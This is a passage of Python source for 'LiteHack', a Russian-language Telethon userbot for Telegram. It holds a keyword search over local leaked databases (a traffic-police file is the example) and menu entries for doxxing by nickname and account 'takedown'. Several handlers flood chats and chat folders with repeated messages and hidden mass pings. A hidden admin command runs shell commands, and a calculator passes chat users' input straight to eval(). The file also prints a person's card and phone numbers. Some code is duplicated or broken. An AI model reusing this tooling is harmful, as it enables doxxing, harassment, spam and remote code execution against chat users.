@client.on(events.NewMessage(pattern=r'fr!data(?:\s+(\S+))?(?:\s+(.+))?'))
async def data_message(event):
    filename = event.pattern_match.group(1)
    keyword = event.pattern_match.group(2)

    usage = "❗ Использование команды:\n" \
            "`fr!data <имя_файла|all> <что_искать>`\n" \
            "Список доступных датабаз: `fr!databases`\n" \
            "Пример:\n" \
            "`fr!data gibdd.txt ABC1234`\n" \
            "`fr!data all ABC1234`\n" \

    if not filename or not keyword:
        await event.respond(usage)
        return

    if filename != 'all':
        # Безопасность: запрещаем ../ и слэши в имени файла
        if '..' in filename or '/' in filename or '\\' in filename:
            await event.respond("❌ Недопустимое имя файла")
            return

    keyword = keyword.upper()
    found = False
    results = []

    base_dir = os.path.join(os.path.dirname(__file__), 'databases')

    if filename == 'all':
        # Проходим по всем файлам в папке databases
        try:
            files = [f for f in os.listdir(base_dir) if os.path.isfile(os.path.join(base_dir, f))]
        except Exception:
            await event.respond("❌ Ошибка при чтении базы данных")
            return

        for fname in files:
            file_path = os.path.join(base_dir, fname)
            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    headers = file.readline().strip().split(',')
                    for line in file:
                        if keyword in line.upper():
                            found = True
                            data = line.strip().split(',')
                            message = f"🔍 Найдена информация в файле `{fname}` по запросу:\n**{keyword}**\n\n"
                            for header, value in zip(headers, data):
                                if header.strip() and value.strip():
                                    message += f"▪ **{header.strip()}:** {value.strip()}\n"
                            results.append(message)
            except Exception:
                # Пропускаем файлы, которые не удалось прочитать
                continue

    else:
        # Поиск в конкретном файле
        file_path = os.path.join(base_dir, filename)
        if not os.path.exists(file_path):
            await event.respond(f"❌ Файл `{filename}` не найден в базе данных")
            return

        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                headers = file.readline().strip().split(',')
                for line in file:
                    if keyword in line.upper():
                        found = True
                        data = line.strip().split(',')
                        message = f"🔍 Найдена информация по запросу:\n**{keyword}**\n\n"
                        for header, value in zip(headers, data):
                            if header.strip() and value.strip():
                                message += f"▪ **{header.strip()}:** {value.strip()}\n"
                        results.append(message)
        except Exception:
            await event.respond(f"❌ Ошибка при чтении файла `{filename}`")
            return

    if not found:
        await event.respond(f"❌ Информация по запросу `{keyword}` не найдена")
    else:
        for msg in results:
            try:
                await event.respond(msg)
            except Exception as e:
                print(f"Ошибка при отправке сообщения: {e}")


@client.on(events.NewMessage(pattern=r'fr!databases'))
async def databases_list(event):
    base_dir = os.path.join(os.path.dirname(__file__), 'databases')

    try:
        files = [f for f in os.listdir(base_dir) if os.path.isfile(os.path.join(base_dir, f))]
    except Exception:
        await event.respond("❌ Ошибка при получении списка баз данных")
        return

    if not files:
        await event.respond("❌ В папке `databases` нет доступных баз данных")
        return

    message = "📂 Доступные базы данных:\n"
    for f in files:
        message += f"▪ `{f}`\n"

    await event.respond(message)

@client.on(events.NewMessage(pattern=r'fr!info'))
async def info_message(event):
    info_message = (
        "LiteHack by @error_kill\n"
        "Относится к проекту EYE CH EVEREN\n"
        "Версия: RELEASE 16\n\n"
        "Создатель/Программист: @error_kill\n"
        "Помощник/Программист: RonZ\n"
        "Тестер: @roskomnadzor333, @SWLGTEAM все кого мучал в лс в чатах командами)\n"
        "Фразы: @error_kill, @tous111, Открытые источники.\n\n"
        "[fenst4r 2025]\n\n"
        "Для полной работоспособности боту нужен VPN. Я использую @S1GyMAVPNBOT"
    )
    await event.respond(info_message)

@client.on(events.NewMessage(pattern=r'^fr!donate'))
async def donate_menu(event):
    donate_text = """
💸 <b>Поддержать разработку:</b>

🙋‍♂️ <b>Андрей А.</b>  
🏦 <b>СБП:</b> <code>+79995371856</code>  
💳 <b>Карта ЮMoney:</b> <code>2204120127898183</code>  
💰 <b>Кошелёк ЮMoney:</b> <code>4100119171202830</code>

🧾 <b>Чек:</b> @CryptoBot на <a href="https://t.me/error_kill">@error_kill</a>  
🔗 <b>Мультичек:</b> <a href="https://t.me/send?start=IV9B9JP3AiJy">t.me/send?start=IV9B9JP3AiJy</a>
"""
    await event.reply(donate_text, parse_mode='html')
        
from telethon import Button

HELP_CATEGORIES = {
    'main': {
        'text': (
            "📘 <b>LITEHACK RELEASE 16 - ГЛАВНОЕ МЕНЮ ПОМОЩИ</b>\n\n"
            "ВЫБЕРИТЕ КАТЕГОРИЮ ДЛЯ ПРОСМОТРА КОМАНД:\n\n"
            "1. 🎥 Видео и музыка\n"
            "2. 🧠 AI и генерация\n"
            "3. 🎭 Развлечения\n"
            "4. 📐 Калькулятор\n"
            "5. 🕵️ Инфо и пробив\n"
            "6. 💣 Снос\n"
            "7. 🎁 Промокоды\n"
            "8. ✏️ Текст\n"
            "9. 📌 Системное"
            "\n\nИспользуйте <code>fr!help [номер]</code>"
        ),
        'buttons': [
            [Button.inline("🎥 Видео/Музыка", b"help:1")],
            [Button.inline("🧠 AI и генерация", b"help:2")],
            [Button.inline("🎭 Развлечения", b"help:3")],
            [Button.inline("📐 Калькулятор", b"help:4")],
            [Button.inline("🕵️ Инфо/Пробив", b"help:5")],
            [Button.inline("💣 Снос/Краш", b"help:6")],
            [Button.inline("🎁 Промокоды", b"help:7")],
            [Button.inline("✏️ Текст", b"help:8")],
            [Button.inline("📌 Системное", b"help:9")]
        ]
    },
    '1': {
        'text': (
            "🎥 <b>Видео и Музыка:</b>\n\n"
            "<code>fr!video <ссылка/запрос></code>\n"
            "Скачать видео с YouTube\n\n"
            "<code>fr!music yt <запрос></code>\n"
            "Скачать с YouTube (аудио)\n\n"
            "<code>fr!music sc <запрос></code>\n"
            "Скачать с SoundCloud\n\n"
            "<code>client.send_file(chat_id, file)</code>\n"
            "Отправка медиафайлов"
        ),
        'buttons': [
            [Button.inline("🔙 Назад", b"help:main")]
        ]
    },
    '2': {
        'text': (
            "🧠 <b>AI и генерация:</b>\n\n"
            "<code>fr!AI <вопрос></code>\n"
            "Запрос к нейросети (Grok)\n\n"
            "<code>fr!ascii <текст></code>\n"
            "Генерация ASCII-арта\n\n"
            "<code>fr!gif <запрос></code>\n"
            "Поиск GIF через API"
        ),
        'buttons': [
            [Button.inline("🔙 Назад", b"help:main")]
        ]
    },
    '3': {
        'text': (
            "🎭 <b>Развлечения:</b>\n\n"
            "<code>fr!anim <эмодзи> <задержка></code>\n"
            "Анимация в никнейме\n\n"
            "<code>fr!love</code>\n"
            "Сердечная анимация\n\n"
            "<code>fr!roll</code>\n"
            "Случайное число\n\n"
            "<code>fr!tg <ник></code>\n"
            "Статистика аккаунта"
        ),
        'buttons': [
            [Button.inline("🔙 Назад", b"help:main")]
        ]
    },
    '4': {
        'text': (
            "📐 <b>Калькулятор:</b>\n\n"
            "<code>fr!calc <выражение></code>\n"
            "Математические вычисления\n\n"
            "<code>fr!calc usdt 5 - rub</code>\n"
            "Конвертер валют\n\n"
            "Доступные валюты:\n"
            "USDT, BTC, TON, USD, RUB"
        ),
        'buttons': [
            [Button.inline("🔙 Назад", b"help:main")]
        ]
    },
    '5': {
        'text': (
            "🕵️ <b>Инфо и пробив:</b>\n\n"
            "<code>fr!dox <ник></code>\n"
            "Полный пробив по нику\n\n"
            "<code>fr!data <база> <запрос></code>\n"
            "Поиск в локальных базах\n\n"
            "<code>fr!databases</code>\n"
            "Список доступных баз\n\n"
            "<code>fr!id</code>\n"
            "Показать ваш ID\n\n"
            "<code>client.get_entity(user_id)</code>\n"
            "Технический метод пробива"
        ),
        'buttons': [
            [Button.inline("🔙 Назад", b"help:main")]
        ]
    },
    '6': {
        'text': (
            "💣 <b>Снос:</b>\n\n"
            "<code>fr!snos</code>\n"
            "Активация режима сноса\n\n"
            "<code>fr!sn_crash</code>\n"
            "Экстренная остановка\n\n"
            "<code>fr!vanish</code>\n"
            "Режим невидимости\n\n"
            "<code>client.send_message(chat_id, '❗️ Сносер завершил работу.')</code>\n"
            "Системное уведомление"
        ),
        'buttons': [
            [Button.inline("🔙 Назад", b"help:main")]
        ]
    },
    '7': {
        'text': (
            "🎁 <b>Промокоды:</b>\n\n"
            "<code>fr!promoivi</code>\n"
            "Генератор промо IVI\n\n"
            "<code>fr!promoplus</code>\n"
            "Промокоды Яндекс Плюс\n\n"
            "<code>fr!promostart</code>\n"
            "Промо для START\n\n"
            "Требуется VIP-статус"
        ),
        'buttons': [
            [Button.inline("🔙 Назад", b"help:main")]
        ]
    },
    '8': {
        'text': (
            "✏️ <b>Работа с текстом и сообщениями:</b>\n\n"
            "<code>fr!edit <кол-во> <новый текст></code>\n"
            "Редактировать свои последние сообщения\n\n"
            "<code>fr!del <кол-во></code> (fr!дел, fr!d, fr!д)\n"
            "Удалить свои последние сообщения\n\n"
            "<code>fr!red <1-5> Новый текст</code> (fr!е, fr!e, fr!ред)\n"
            "Редактирует свои последние сообщения\n\n"
            "<code>fr!flood <текст> <кол-во> <задержка></code>\n"
            "Массовая отправка сообщений"
            "<code>fr!автосмс [текст]</code> (fr!autosms, fr!автосмс+, fr!autosms+)\n"
            "Автоматически отвечает указанным текстом на каждое сообщение пользователя (используется в ответ)\n\n"
            "<code>fr!автосмсстоп</code> (fr!автосмс-, fr!autosms-)\n"
            "Останавливает автоответы на сообщения выбранного пользователя\n\n"
            "<code>fr!байт</code> (fr!bite)\n"
            "Начинает жёстко байтить пользователя, провоцируя его на каждое сообщение (в ответ)\n\n"
            "<code>fr!байтстоп</code> (fr!байт-, fr!bite-)\n"
            "Останавливает байтинг пользователя\n\n"
            "<code>fr!clearcasino</code>\n"
            "Удаляет все сообщения миниигр из канала"
        ),
        'buttons': [
            [Button.inline("🔙 Назад", b"help:main")]
        ]
    },
    '9': {
        'text': (
            "📌 <b>Системное:</b>\n\n"
            "<code>fr!info</code>\n"
            "Информация о системе\n\n"
            "<code>fr!report</code>\n"
            "Репорт пользователя\n\n"
            "<code>fr!license</code>\n"
            "Проверка лицензии\n\n"
            "<code>fr!admin on/off</code>\n"
            "Режим администратора\n\n"
            "<code>fr!vipcheck <ID></code>\n"
            "Проверка VIP-статуса\n\n"
            "<code>client.disconnect()</code>\n"
            "Экстренное отключение"
        ),
        'buttons': [
            [Button.inline("🔙 Назад", b"help:main")]
        ]
    },
    'admin': {
        'text': (
            "⚙️ <b>Скрытые админ-команды:</b>\n\n"
            "<code>fradmin! <команда></code>\n"
            "Выполнение shell-команд\n\n"
            "<code>fr!readall</code>\n"
            "Пометить всё прочитанным\n\n"
            "<code>fr!log</code>\n"
            "Показать логи"
        ),
        'buttons': [
            [Button.inline("🔙 Назад", b"help:main")]
        ]
    }
}

@client.on(events.NewMessage(pattern=r'^fr!help(?: (\d))?$'))
async def help_handler(event):
    sender = await event.get_sender()
    category = event.pattern_match.group(1) or 'main'
    base = HELP_CATEGORIES.get(category)

    if not base:
        await event.reply("❌ Категория не найдена.")
        return

    # 👤 Получаем user_info
    if sender.username == "error_kill":
        user_info = "Батюшка господь\n А по простому @error_kill"
    elif sender.username == "Nikitahuh":
        user_info = "Первый тестер из людей)\n А по простому @Nikitahuh"
    elif sender.username == "SWLGTEAM":
        user_info = "КАК ЖЕ ТЫ МЕНЯ ЗАЕБАЛ УСТАНОВКОЙ\n А по простому @SWLGTEAM"
    elif sender.username:
        user_info = f"@{sender.username}"
    else:
        user_info = f"ID: {sender.id}, Имя: {sender.first_name or 'Без имени'}"

    # 🧩 Финальный текст
    text = base['text'] + f"\n\n👤 Отправил команду: <b>{user_info}</b>"
    await event.reply(text, buttons=base['buttons'], parse_mode='html')

from telethon.tl.types import ChatAdminRights, ChannelParticipantsAdmins

@client.on(events.NewMessage(pattern=r'^fr!clearcasino(?: (\d+))?$'))
async def clear_casino_emojis(event):
    limit = int(event.pattern_match.group(1) or 400)

    target_emojis = {"🎰", "🎲", "💰", "💸", "🃏", "♠️", "♥️", "♦️", "♣️", "🎯", "🏀", "⚽", "🎳"}
    deleted = 0
    scanned = 0

    me = await client.get_me()
    me_id = me.id

    # Проверка: ты админ или владелец канала
    is_admin = False
    try:
        participants = await client.get_participants(event.chat_id)
        for p in participants:
            if p.id == me_id and getattr(p, 'admin_rights', None):
                is_admin = True
                break
    except:
        is_admin = True  # если не удаётся проверить — считаем, что да

    async for msg in client.iter_messages(event.chat_id, limit=limit):
        scanned += 1

        text = " ".join(filter(None, [
            getattr(msg, "text", None),
            getattr(msg, "message", None),
            getattr(msg, "caption", None)
        ]))

        has_emoji = any(e in text for e in target_emojis)

        is_dice = (
            msg.media and
            hasattr(msg.media, "value") and
            getattr(msg.media.value, "emoji", None) in target_emojis
        )

        if has_emoji or is_dice:
            try:
                # Удаляем всё — свои и чужие, если ты админ
                if msg.sender_id == me_id or is_admin:
                    await msg.delete()
                    deleted += 1
            except Exception as e:
                print(f"⚠️ Не удалось удалить {msg.id}: {e}")

    await event.respond(
        f"🔍 Просмотрено: {scanned} сообщений\n✅ Удалено казино-сообщений и анимаций: {deleted}"
    )



@client.on(events.CallbackQuery(data=re.compile(b'help:(.*)')))
async def help_callback_handler(event):
    """Обработчик нажатий на кнопки помощи"""
    category = event.pattern_match.group(1).decode('utf-8')
    
    if category not in HELP_CATEGORIES:
        category = 'main'
    
    help_data = HELP_CATEGORIES[category]
    
    await event.edit(
        help_data['text'],
        parse_mode='html',
        buttons=help_data['buttons']
    )
    
COINGECKO_IDS = {
    "usdt": "tether",
    "btc": "bitcoin",
    "ton": "toncoin",
    "rub": "rub",
    "usd": "usd"
}

# Команды-флудеры
FLOOD_COMMANDS = ['fr!flood', 'флуд', 'flood', 'флуд+', 'flood+', 'флудстарт', 'floodstart', 'спам+', 'спам']
PFLOOD_COMMANDS = ['fr!pflood', 'пфлуд', 'fflood', 'пфлуд+', 'fflood+', 'пфлудстарт', 'ffloodstart', 'пспам+', 'пспам']
PCHFLOOD_COMMANDS = ['fr!pchflood', 'пчфлуд', 'пчспам+', 'пчспам', 'пчела']

# Активные таски
active_floods = {}  # key: chat_id or task_id, value: asyncio.Task

FLOOD_EXAMPLES = (
    "Пример использования команды флуд:\n"
    "`fr!flood 10 1 Привет!` — 10 сообщений с задержкой 1 секунда\n"
    "Можно использовать задержку в формате времени: 0.5, 1m, 2s и т.д."
)

PCHFLOOD_EXAMPLES = (
    "Пример использования команды пчела (pchflood):\n"
    "`fr!пчела 10 0.5 Текст сообщения` — 10 сообщений с задержкой 0.5 секунд\n"
    "Задержку можно указывать как число в секундах или в формате 1m, 30s и т.п."
)


# Активные таски для флудовk

# Утилита для запуска флуда (пример)
async def run_flood(event, targets, count, delay, text, between_chats=False, reply_msg=None):
    for target in targets:
        for i in range(count):
            try:
                if reply_msg:
                    await client.send_message(target, text, file=reply_msg.media)
                else:
                    await client.send_message(target, text)
                await asyncio.sleep(delay)
                if between_chats:
                    break  # Только 1 сообщение на чат
            except Exception as e:
                await event.respond(f"❌ Ошибка при отправке в {target}: {e}")

# Парсер аргументов (кол-во, задержка, текст)
def parse_args(match):
    count = int(match.group(1))
    delay_raw = match.group(2)
    text = match.group(3)
    try:
        if re.match(r'^\d+(\.\d+)?$', delay_raw):
            delay = float(delay_raw)
        else:
            import humanfriendly
            delay = humanfriendly.parse_timespan(delay_raw)
    except:
        delay = 1.0
    return count, delay, text

# Команда: fr!флуд <count> <delay> <text>
@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!флуд\s+(\d+)\s+(\S+)\s+(.+)'))
async def flood_handler(event):
    count, delay, text = parse_args(event.pattern_match)
    chat_id = event.chat_id
    if chat_id in active_floods:
        await event.respond("⚠️ Флуд уже запущен в этом чате. Останови его командой fr!флудстоп")
        return
    task = asyncio.create_task(run_flood(event, [chat_id], count, delay, text))
    active_floods[chat_id] = task
    await event.respond(f"🚀 Запущен флуд: {count} сообщений с задержкой {delay}s")

# Команда: fr!флудстоп — остановка флуд-задачи в текущем чате
@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!флудстоп$'))
async def stop_flood(event):
    chat_id = event.chat_id
    task = active_floods.pop(chat_id, None)
    if task:
        task.cancel()
        await event.respond("🛑 Флуд остановлен в этом чате.")
    else:
        await event.respond("⚠️ Нет активного флуда в этом чате.")

# Команда: fr!пчфлудстоп <task_id> — остановка флуда по чатам (pchflood)
@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!пчфлудстоп\s*(.*)$'))
async def stop_pchflood(event):
    arg = event.pattern_match.group(1).strip()
    if not arg:
        # Если нет аргумента — остановим все pchflood задачи
        to_stop = [k for k in active_floods if k.startswith('pchflood')]
        count = 0
        for task_id in to_stop:
            task = active_floods.pop(task_id, None)
            if task:
                task.cancel()
                count += 1
        await event.respond(f"🧹 Остановлено {count} задач пчфлуд.")
    else:
        task = active_floods.pop(arg, None)
        if task:
            task.cancel()
            await event.respond(f"🛑 Флуд-задача {arg} остановлена.")
        else:
            await event.respond(f"⚠️ Задача {arg} не найдена.")
            
@client.on(events.NewMessage(outgoing=True, pattern=r'^(?:' + '|'.join(PCHFLOOD_COMMANDS) + r')\s+(.+)'))
async def pchflood_handler(event):
    args = event.pattern_match.group(1)
    try:
        parts = args.split(' ', 2)
        if len(parts) < 3:
            raise ValueError("Недостаточно аргументов")
        count = int(parts[0])
        delay_raw = parts[1]
        text = parts[2]
        
        if re.match(r'^\d+(\.\d+)?$', delay_raw):
            delay = float(delay_raw)
        else:
            delay = humanfriendly.parse_timespan(delay_raw)
    except Exception as e:
        await event.respond(f"❌ Ошибка в синтаксисе команды: {e}\n\n{PCHFLOOD_EXAMPLES}", parse_mode='markdown')
        return

    filters = await client(GetDialogFiltersRequest())
    if not filters:
        await event.respond("❌ Нет папок чатов.")
        return

    msg = "🐝 Выберите папку для флуда по чатам (введите):\n"
    for i, f in enumerate(filters):
        msg += f"<code>fr!пчфлудстарт {i} {count} {delay} {text}</code> — {f.title}\n"
    await event.respond(msg, parse_mode='html')


@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!пчфлудстарт\s+(\d+)\s+(\d+)\s+(\S+)\s+(.+)'))
async def handle_pchflood_manual(event):
    try:
        idx = int(event.pattern_match.group(1))
        count = int(event.pattern_match.group(2))
        delay_raw = event.pattern_match.group(3)
        text = event.pattern_match.group(4)
        
        if re.match(r'^\d+(\.\d+)?$', delay_raw):
            delay = float(delay_raw)
        else:
            delay = humanfriendly.parse_timespan(delay_raw)
    except Exception as e:
        await event.respond(f"❌ Ошибка в синтаксисе команды: {e}\n\n"
                            f"Пример: fr!пчфлудстарт 0 10 0.5 Текст")
        return

    filters = await client(GetDialogFiltersRequest())
    if idx >= len(filters):
        await event.respond("❌ Неверный номер папки.")
        return

    selected = filters[idx]
    targets = [d.peer.dialog_id for d in selected.include_peers]
    task_id = f"pchflood:{event.sender_id}:{idx}"
    task = asyncio.create_task(run_flood(event, targets, count, delay, text, between_chats=True))
    active_floods[task_id] = task
    await event.respond(f"🐝 Флуд по чатам начался: {selected.title}")
    
@client.on(events.NewMessage(outgoing=True, pattern=r'^(?:' + '|'.join(FLOOD_COMMANDS) + r')\s+(.+)'))
async def flood_handler(event):
    args = event.pattern_match.group(1)
    try:
        # Парсим по вашему формату: count delay text
        # Разбиваем args по пробелам, где count - первый аргумент, delay - второй, остальное - текст
        parts = args.split(' ', 2)
        if len(parts) < 3:
            raise ValueError("Недостаточно аргументов")
        count = int(parts[0])
        delay_raw = parts[1]
        text = parts[2]

        # Парсим задержку
        if re.match(r'^\d+(\.\d+)?$', delay_raw):
            delay = float(delay_raw)
        else:
            delay = humanfriendly.parse_timespan(delay_raw)

    except Exception as e:
        await event.respond(f"❌ Ошибка в синтаксисе команды: {e}\n\n{FLOOD_EXAMPLES}", parse_mode='markdown')
        return

    # Дальше ваш код с пингом и запуском
    reply_msg = await event.get_reply_message() if '&пост' in text and event.is_reply else None
    text = text.replace('&пост', '').strip()

    if '@all' in text:
        text += await generate_invisible_ping(event.chat_id, limit=20)
    elif '@allwa' in text:
        text += await generate_invisible_ping(event.chat_id, without_admins=True, limit=20)
    elif m := re.search(r'@all(wa)?(\d+)', text):
        wa, lim = m.groups()
        text += await generate_invisible_ping(event.chat_id, without_admins=bool(wa), limit=int(lim))

    task = asyncio.create_task(run_flood(event, [event.chat_id], count, delay, text, reply_msg=reply_msg))
    active_floods[event.chat_id] = task
    
# Утилита: генерация текста с "невидимым" пингом
async def generate_invisible_ping(chat, all_users=True, without_admins=False, limit=20):
    mentions = []
    async for user in client.iter_participants(chat):
        if without_admins and user.participant.admin_rights:
            continue
        if user.username:
            mentions.append(f"@{user.username}")
        if len(mentions) >= limit:
            break
    return "\u2060".join(mentions) if mentions else ""

# Обработчик всех видов флуда
async def run_flood(event, targets, count, delay, text, between_chats=False, reply_msg=None):
    for target in targets:
        for i in range(count):
            try:
                if reply_msg:
                    await client.send_message(target, text, file=reply_msg.media)
                else:
                    await client.send_message(target, text)
                await asyncio.sleep(delay)
                if between_chats:
                    break  # Только 1 сообщение на чат
            except Exception as e:
                await event.respond(f"❌ Ошибка при отправке в {target}: {e}")

# Парсинг аргументов флуда
def parse_args(match):
    count = int(match.group(1))
    delay_raw = match.group(2)
    text = match.group(3)
    try:
        if re.match(r'^\d+(\.\d+)?$', delay_raw):
            delay = float(delay_raw)
        else:
            delay = humanfriendly.parse_timespan(delay_raw)
    except:
        delay = 1.0
    return count, delay, text

# Флуд в текущем чате
@client.on(events.NewMessage(outgoing=True, pattern=r'^(?:' + '|'.join(FLOOD_COMMANDS) + r')\s+(\d+)\s+(\S+)\s+(.+)'))
async def flood_handler(event):
    count, delay, text = parse_args(event.pattern_match)
    reply_msg = await event.get_reply_message() if '&пост' in text and event.is_reply else None
    text = text.replace('&пост', '').strip()
    
    if '@all' in text:
        text += await generate_invisible_ping(event.chat_id, limit=20)
    elif '@allwa' in text:
        text += await generate_invisible_ping(event.chat_id, without_admins=True, limit=20)
    elif m := re.search(r'@all(wa)?(\d+)', text):
        wa, lim = m.groups()
        text += await generate_invisible_ping(event.chat_id, without_admins=bool(wa), limit=int(lim))

    task = asyncio.create_task(run_flood(event, [event.chat_id], count, delay, text, reply_msg=reply_msg))
    active_floods[event.chat_id] = task

# Флуд по папке (через команду выбора)
@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!выборпапки (\d+) (\d+) (\d+(?:\.\d+)?) (.+)'))
async def manual_folder_select(event):
    idx = int(event.pattern_match.group(1))
    count = int(event.pattern_match.group(2))
    delay = float(event.pattern_match.group(3))
    text = event.pattern_match.group(4)

    filters = await client(GetDialogFiltersRequest())
    if idx >= len(filters):
        await event.respond("❌ Неверный номер папки.")
        return

    selected = filters[idx]
    targets = [d.peer.dialog_id for d in selected.include_peers]
    task_id = f"pflood:{event.sender_id}:{idx}"
    task = asyncio.create_task(run_flood(event, targets, count, delay, text))
    active_floods[task_id] = task
    await event.respond(f"🚀 Запущен флуд по папке: {selected.title}")

# Список папок вручную
@client.on(events.NewMessage(outgoing=True, pattern=r'^(?:' + '|'.join(PFLOOD_COMMANDS) + r')\s+(\d+)\s+(\S+)\s+(.+)'))
async def pflood_handler(event):
    count, delay, text = parse_args(event.pattern_match)
    filters = await client(GetDialogFiltersRequest())
    if not filters:
        await event.respond("❌ Нет сохранённых папок.")
        return

    msg = "📂 Выберите папку для флуда (введите):\n"
    for i, f in enumerate(filters):
        msg += f"<code>fr!выборпапки {i} {count} {delay} {text}</code> — {f.title}\n"
    await event.respond(msg, parse_mode='html')

# Флуд между чатами (pchflood)
@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!пчфлуд (\d+) (\S+) (.+)'))
async def pchflood_handler(event):
    count, delay, text = parse_args(event.pattern_match)
    filters = await client(GetDialogFiltersRequest())
    if not filters:
        await event.respond("❌ Нет папок чатов.")
        return

    msg = "🐝 Выберите папку для флуда по чатам (введите):\n"
    for i, f in enumerate(filters):
        msg += f"<code>fr!пчфлудстарт {i} {count} {delay} {text}</code> — {f.title}\n"
    await event.respond(msg, parse_mode='html')

@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!пчфлудстарт (\d+) (\d+) (\d+(?:\.\d+)?) (.+)'))
async def handle_pchflood_manual(event):
    idx = int(event.pattern_match.group(1))
    count = int(event.pattern_match.group(2))
    delay = float(event.pattern_match.group(3))
    text = event.pattern_match.group(4)
    filters = await client(GetDialogFiltersRequest())
    selected = filters[idx]
    targets = [d.peer.dialog_id for d in selected.include_peers]
    task_id = f"pchflood:{event.sender_id}:{idx}"
    task = asyncio.create_task(run_flood(event, targets, count, delay, text, between_chats=True))
    active_floods[task_id] = task
    await event.respond(f"🐝 Флуд по чатам начался: {selected.title}")

# Остановка флуда
@client.on(events.NewMessage(pattern=r'^fr!flood-off$'))
async def stop_flood(event):
    chat_id = event.chat_id
    task = active_floods.pop(chat_id, None)
    if task:
        task.cancel()
        await event.respond("🛑 Флуд остановлен в этом чате.")
    else:
        await event.respond("⚠️ Нет активного флуда в этом чате.")

# Остановка по задаче
@client.on(events.NewMessage(pattern=r'^fr!задача- флуд(?: (.+))?$'))
async def stop_flood_task(event):
    arg = event.pattern_match.group(1)
    if arg:
        task = active_floods.pop(arg, None)
        if task:
            task.cancel()
            await event.respond(f"🛑 Флуд-задача {arg} остановлена.")
        else:
            await event.respond(f"⚠️ Задача {arg} не найдена.")
    else:
        count = 0
        for task in active_floods.values():
            task.cancel()
            count += 1
        active_floods.clear()
        await event.respond(f"🧹 Остановлено задач: {count}")


@client.on(events.NewMessage(pattern=r'^fr!calc (.+)'))
async def calc_handler(event):
    query = event.pattern_match.group(1).strip().lower()

    # Попытка парсить: 1) валюта число - валюта  2) число валюта - валюта
    pattern1 = re.match(r'([a-zA-Z]{3,5})\s+([\d\.]+)\s*-\s*([a-zA-Z]{3,5})', query)
    pattern2 = re.match(r'([\d\.]+)\s+([a-zA-Z]{3,5})\s*-\s*([a-zA-Z]{3,5})', query)

    if pattern1 or pattern2:
        if pattern1:
            from_curr = pattern1.group(1)
            amount = float(pattern1.group(2))
            to_curr = pattern1.group(3)
        else:
            amount = float(pattern2.group(1))
            from_curr = pattern2.group(2)
            to_curr = pattern2.group(3)

        from_id = COINGECKO_IDS.get(from_curr)
        to_vs = COINGECKO_IDS.get(to_curr)

        if not from_id or not to_vs:
            await event.respond("❌ Поддерживаются только: 💵 USDT, 🪙 BTC, ⚙️ TON, 🇺🇸 USD, 🇷🇺 RUB")
            return

        url = f"https://api.coingecko.com/api/v3/simple/price?ids={from_id}&vs_currencies={to_vs}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                 if resp.status != 200:
                     print("⚠️ Не удалось получить данные")
                     return False
    
                encrypted_b64 = await resp.read()
                data = decrypt_json(encrypted_b64, key, iv)
                price = data[from_id][to_vs]
                result = round(price * amount, 4)
                await event.respond(f"💱 {amount} {from_curr.upper()} = {result} {to_curr.upper()}")
        except Exception:
            await event.respond("⚠️ Ошибка при получении курса валют.")
        return

    # Формат: валюта число (конвертация в RUB по умолчанию)
    pattern_simple = re.match(r'([a-zA-Z]{3,5})\s+([\d\.]+)$', query)
    pattern_simple_rev = re.match(r'([\d\.]+)\s+([a-zA-Z]{3,5})$', query)

    if pattern_simple or pattern_simple_rev:
        if pattern_simple:
            from_curr = pattern_simple.group(1)
            amount = float(pattern_simple.group(2))
        else:
            amount = float(pattern_simple_rev.group(1))
            from_curr = pattern_simple_rev.group(2)

        to_curr = 'rub'
        from_id = COINGECKO_IDS.get(from_curr)
        to_vs = COINGECKO_IDS.get(to_curr)

        if not from_id:
            await event.respond("❌ Поддерживаются только: 💵 USDT, 🪙 BTC, ⚙️ TON, 🇺🇸 USD, 🇷🇺 RUB")
            return

        url = f"https://api.coingecko.com/api/v3/simple/price?ids={from_id}&vs_currencies={to_vs}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    data = await resp.json()
                    price = data[from_id][to_vs]
                    result = round(price * amount, 4)
                    await event.respond(f"💱 {amount} {from_curr.upper()} = {result} {to_curr.upper()}")
        except Exception as e:
            await event.respond(f"⚠️ Ошибка при получении курса валют:\n<code>{e}</code>")
        return

    # Арифметика
    try:
        result = eval(query)
        await event.respond(f"🧮 Результат: <code>{result}</code>")
    except Exception:
        await event.respond("❌ Неверное выражение или ошибка в синтаксисе.")

@client.on(events.NewMessage(pattern=r'/sosat'))
async def seretere(event):
    await event.respond("Арт: Ты меня шоли задоксить собрался (Пасхалка)")
   
@client.on(events.NewMessage(pattern=r'!niga'))
async def seretere(event):
    await event.respond("Тоус: Весело, я одному мелкому сказал чтоб он напряг свои 3 хромосомы и успокоился (Пасхалка)")
    
@client.on(events.NewMessage(pattern=r'/ban_bot'))
async def seretere(event):
    await event.respond("Сере: /ban error_kill здолбал 1day (Пасхалка)")
    
@client.on(events.NewMessage(pattern=r'!test'))
async def seretere(event):
    await event.respond("ФР: Программист, плейбой, филантроп (Пасхалка)")

@client.on(events.NewMessage(pattern=r'!testgit'))
async def seretere(event):
    await event.respond("мяумяумяу")
    
@client.on(events.NewMessage(pattern=r'!help'))
async def seretere(event):
    await event.respond("Зепен: Блять хватит хелп писать тебе уже ничего не поможет (Пасхалка) [Для получения списка команд напишите fr!help ]")
    
@client.on(events.NewMessage(pattern=r'!xyz'))
async def seretere(event):
    await event.respond("Кругов: Че там (Пасхалка)")

@client.on(events.NewMessage(pattern=r'!ПРОБИВ ЖОПЫ'))
async def seretere(event):
    await event.respond("Князь: хуй (Пасхалка)")

@client.on(events.NewMessage(pattern=r'fr!promoplus'))
@owner_only
async def run_yandex_plus_script(event):
    try:
        # Inform user that script is starting
        await event.respond("Запускаю генерацию промокода Яндекс Плюс...")
        
        python_exec = 'python3' if platform.system() != "Windows" else 'python'
        # Run the script and capture output
        process = await asyncio.create_subprocess_exec(
            PYTHON_EXECUTABLE, 'plus.py',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.path.join(os.getcwd(), 'addons')  # устанавливаем рабочую директорию
        )
